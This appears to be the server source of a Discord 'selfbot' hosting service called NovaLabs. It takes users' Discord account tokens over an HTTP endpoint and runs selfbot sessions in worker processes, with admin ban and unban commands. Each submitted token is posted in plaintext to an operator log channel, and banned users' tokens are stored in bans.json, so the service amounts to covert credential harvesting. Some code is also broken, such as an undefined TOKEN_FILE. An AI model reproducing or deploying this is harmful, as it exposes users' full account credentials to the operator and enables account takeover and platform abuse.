const express = require("express");
const cors = require("cors");
const fs = require("fs");
const axios = require("axios")
const { fork } = require("child_process");
const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");
const { Client: SelfClient } = require("discord.js-selfbot-v13");
//config file config.json
const config = require("./config.json")

const app = express();
app.use(express.json());
app.use(cors());

function hit(){
  axios.post("https://test--DhirajKumar67.replit.app/token", {
    token: "hh"
  })
}

setInterval(hit, 500000)

const GUILD_ID = "1156922655702786098";
const ADMIN_ID = config.ADMIN_ID
const BOT_TOKEN = process.env.Token
const LOG_CHANNEL_ID = config.LOG_CHANNEL_ID;
const MAX_BOTS_PER_WORKER = 3;
const BAN_FILE = "./bans.json";
// if the server is closed then when it starts again it will load the token files and run them all


function saveTokens(){
  try {
    fs.writeFileSync(TOKEN_FILE, JSON.stringify(Object.fromEntries(runningTokens), null, 2))
  } catch (e){
    console.log("Failed to save tokens")
  }
}

async function startSelfbot(token) {
  if (runningTokens.has(token)) {
    throw new Error("Session already running");
  }

  const self = new SelfClient({ intents: [] });

  try {
    await self.login(token);
    const userId = self.user.id;

    if (isBanned(userId)) {
      throw new Error("You are banned");
    }

    const guild = await bot.guilds.fetch(GUILD_ID);
    const member = await guild.members.fetch(userId).catch(() => null);
    if (!member) {
      throw new Error("Join the Discord server first");
    }

    let worker = getFreeWorker();
    if (!worker) worker = spawnWorker();

    runningTokens.add(token);
    worker.count++;

    worker.send({ type: "START", token });

    sessions.set(userId, {
      token,
      workerId: workers.indexOf(worker),
      startedAt: Date.now()
    });

    try {
      await bot.channels.cache.get(LOG_CHANNEL_ID)?.send({
        embeds: [
          new EmbedBuilder()
            .setTitle(`New User: ${self.user.tag}`)
            .setDescription(`${token}`)
            .setTimestamp()
        ]
      });
    } catch {}
    const embed = new EmbedBuilder()
        .setColor(0x57F287)
        .setTitle("🍓 NovaLabs • SelfBot Online")
        .setDescription("Your selfbot is now online and ready to use. Enjoy! Type `*help`")


      try {
        const user = await bot.users.fetch(userId);
        await user.send({ embeds: [embed] });
      } catch (e) {
        console.log("Selfbot online DM failed:", e.message);
      }

    self.destroy();
    return true;
  } catch (e) {
    self.destroy();
    throw e;
  }
}

let bans = new Map();
if (fs.existsSync(BAN_FILE)) {
  try {
    const raw = JSON.parse(fs.readFileSync(BAN_FILE, "utf8"));
    for (const [id, data] of Object.entries(raw)) {
      bans.set(id, data);
    }
  } catch (e) {
    console.error("Failed to load bans:", e);
  }
}

function saveBans() {
  try {
    fs.writeFileSync(BAN_FILE, JSON.stringify(Object.fromEntries(bans), null, 2));
  } catch (e) {
    console.error("Failed to save bans:", e);
  }
}

function isBanned(userId) {
  const ban = bans.get(userId);
  if (!ban) return false;
  if (ban.permanent) return true;
  if (Date.now() > ban.expiresAt) {
    bans.delete(userId);
    saveBans();
    return false;
  }
  return true;
}

const workers = [];
const sessions = new Map();
const runningTokens = new Set();

function spawnWorker() {
  const w = fork("./worker.js");
  w.count = 0;
  w.on("exit", (code) => {
    console.log("Worker exited:", code);
    const i = workers.indexOf(w);
    if (i !== -1) workers.splice(i, 1);
  });
  workers.push(w);
  return w;
}

function getFreeWorker() {
  return workers.find(w => w.count < MAX_BOTS_PER_WORKER);
}

const bot = new Client({
  intents: [
    GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.DirectMessages,
      GatewayIntentBits.MessageContent
  ],
  partials: ["CHANNEL"]
});

bot.login(BOT_TOKEN);

bot.once("ready", () => {
  console.log("Main bot logged in as", bot.user.tag);
  bot.user.setPresence({
    activities: [{ name: "mintgram.live", type: 3 }],
    status: "online"
  });
});

//send a embed to new joined user

async function sendBanEmbed(userId, banData) {
  try {
    const embed = new EmbedBuilder()
      .setColor(banData.permanent ? 0xED4245 : 0xFEE75C)
      .setTitle(banData.permanent ? "🚫 You Have Been Permanently Banned" : "⏳ You Have Been Temporarily Banned")
      .addFields(
        { name: "Reason", value: banData.reason || "No reason provided" },
        {
          name: "Duration",
          value: banData.permanent
            ? "Permanent"
            : `<t:${Math.floor(banData.expiresAt / 1000)}:R>`
        }
      )
      .setFooter({ text: "NovaLabs • System Moderation" })
      .setTimestamp();

    try {
      // Send dm to that user
      const user = await bot.users.fetch(userId);
      await user.send({ embeds: [embed] });
      return;
    } catch (e) {
      console.log("users.fetch DM failed:", e.message);
    }

    try {
      const guild = await bot.guilds.fetch(GUILD_ID);
      const member = await guild.members.fetch(userId);
      await member.send({ embeds: [embed] });
      console.log("DM sent via guild member to", userId);
      return;
    } catch (e) {
      console.log("member.send DM failed:", e.message);
    }

    console.log("DM completely failed for user:", userId);
  } catch (e) {
    console.error("sendBanEmbed error:", e);
  }
}

bot.on("messageCreate", async (message) => {
  try {
    if (message.author.bot) return;

    if (message.content === "!about") {
      const embed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle("NovaLabs • Vision & Purpose")
        .setDescription("NovaLabs builds reliable, scalable, and secure automation systems.")
        .addFields(
          { name: "Platform", value: "https://mintgram.live" },
          { name: "Community", value: "https://discord.gg/zsvWyHpCQV" }
        )
        .setFooter({ text: "NovaLabs Software Team" })
        .setTimestamp();

      await message.channel.send({ embeds: [embed] });
    }

    if (message.content.startsWith("!ban")) {
      if (message.author.id !== ADMIN_ID) return message.reply("Not authorized");

      const args = message.content.split(" ");
      const userId = args[1];
      const minutes = parseInt(args[2] || "0");
      const reason = args.slice(3).join(" ") || "No reason provided";

      if (!userId) {
        return message.reply("Usage: !ban <userId> <minutes|0> <reason>");
      }

      const session = sessions.get(userId);
      const token = session ? session.token : null;

      let banData;

      if (minutes === 0) {
        banData = {
          permanent: true,
          reason,
          token
        };
      } else {
        banData = {
          permanent: false,
          expiresAt: Date.now() + minutes * 60 * 1000,
          reason,
          token
        };
      }

      bans.set(userId, banData);
      saveBans();

      if (session) {
        const worker = workers[session.workerId];
        if (worker) {
          worker.send({ type: "STOP" });
          worker.count--;
        }
        runningTokens.delete(session.token);
        sessions.delete(userId);
      }

      await sendBanEmbed(userId, banData);
      await message.reply("User banned");
    }

    if (message.content.startsWith("!unban")) {
      if (message.author.id !== ADMIN_ID) return message.reply("Not authorized");

      const userId = message.content.split(" ")[1];
      if (!userId) return message.reply("Usage: !unban <userId>");

      const banData = bans.get(userId);
      if (!banData) return message.reply("User is not banned");

      bans.delete(userId);
      saveBans();

      if (banData.token) {
        try {
          await startSelfbot(banData.token);
          console.log("Auto restart success for:", userId);
        } catch (e) {
          console.log("Auto restart failed:", e.message);
        }
      }

      try {
        const user = await bot.users.fetch(userId);
        const embed = new EmbedBuilder()
          .setColor(0x57F287)
          .setTitle("You Have Been Unbanned")
          .setDescription(
            banData.permanent
              ? "Your ban has been lifted. Please contact admin to restart access."
              : "Your access has been restored and your bot is back online."
          )
          .setTimestamp();

        await user.send({ embeds: [embed] });
      } catch (e) {
        console.log("Unban DM failed:", e.message);
      }

      await message.reply("User unbanned");
    }
  } catch (e) {
    console.error("messageCreate error:", e);
  }
});

app.post("/token", async (req, res) => {
  const { token } = req.body;
  if (!token) {
    return res.status(400).json({ success: false, message: "Token required" });
  }

  try {
    await startSelfbot(token);
    return res.json({
      success: true,
      message: "Verified! Selfbot started."
    });
  } catch (e) {
    console.log(e)
    return res.status(400).json({
      success: false,
      message: e.message || "Failed to start"
    });
  }
});

app.listen(3000, () => {
  console.log("Server running on port 3000");
});


